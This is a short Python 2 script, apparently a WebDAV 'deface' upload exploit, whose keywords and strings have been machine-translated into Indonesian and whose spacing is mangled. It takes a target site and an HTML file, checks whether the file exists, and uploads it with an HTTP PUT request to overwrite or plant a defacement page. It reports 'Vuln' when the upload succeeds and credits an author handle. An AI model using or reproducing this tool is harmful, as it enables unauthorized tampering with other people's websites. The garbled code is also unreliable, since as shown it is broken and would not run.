#! / usr / bin / python

permintaan impor
impor string
impor acak
impor sys
impor os

os.system ("hapus")

cetak "" "
 __ __ ___. ________ _________ ____
/ \ / \ ____ \ _ | __ \ ______ \ / _ \ \ / /
\ \ / \ / // __ \ | __ \ | | \ / / _ \ \ Y /
 \ / \ ___ / | \ _ \ \ | `\ / | \ /  
  \ __ / \ / \ ___> ___ / _______ / \ ____ | __ / \ ___ /   
       \ / \ / \ / \ / \ / "" "

def webdav ():
  sc = ''
  dengan open (sys.argv [2], 'rb') sebagai f:
      depes = f.read ()
  script = depes
  host = sys.argv [1]
  jika bukan host.startswith ('http'):
    host = 'http: //' + host
  nama = '/'+sys.argv[2]


  print ("[*] Upload Deface:% s")% (sys.argv [2])
  print ("[*] Mengunggah% d byte, Script Baru")% len (script)

  r = requests.request ('put', host + nama, data = script, headers = {'Content-Type': 'application / octet-stream'})

  jika r.status_code <200 atau r.status_code> = 300:
    print ("[!] Upload gagal..")
    sys.exit (1)
  lain:
    print ("[+] File diunggah...")
    print ("[+] Vuln Cuks:" + host + nama)


def cekfile ():
 mencetak("""
[*] Unggah File Eksploitasi Webdav
[*] Penulis: Azis-OlLenk
[*] Github: https://github.com/Mr-Zero076
"" ")
 print ("[*] Cek Target Situs Web:" + sys.argv [1] + "/" + sys.argv [2])
 r = requests.get (sys.argv [1] + "/" + sys.argv [2])
 jika r.status_code == requests.codes.ok:
  print ("[*] File Target Sama Cuks..")
  tanya = raw_input ("[!] Ganti Target File? [Y / T]>")
  jika tanya == "Y":
   webdav ()
  lain:
   print ("[!] Keluar dari Alat...")
   sys.exit ()
 lain:
   print ("[*] Target Proses Cuks...")
   print ("[*] Proses Upload Script Deface Lagi..")
   webdav ()


jika __name__ == '__main__':
  jika len (sys.argv)! = 3:
    print ("\ n [*] Penggunaan:" + sys.argv [0] + "Target.com Deface.htm \ n")
    sys.exit (0)
  lain:
    cekfile ()
